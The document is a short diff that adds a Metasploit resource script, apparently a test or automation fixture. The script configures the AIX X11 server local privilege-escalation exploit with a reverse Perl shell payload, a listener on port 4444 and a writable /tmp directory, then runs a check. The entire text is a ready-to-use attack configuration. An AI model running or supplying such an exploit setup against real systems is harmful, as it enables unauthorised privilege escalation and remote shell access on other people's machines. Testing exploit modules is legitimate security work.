@@ -1,0 +1,8 @@
+use exploit/aix/local/xorg_x11_server
+set SESSION 1
+set WritableDir /tmp
+set LHOST 127.0.0.1
+set LPORT 4444
+set TARGET 1
+set PAYLOAD payload/cmd/unix/reverse_perl
+check
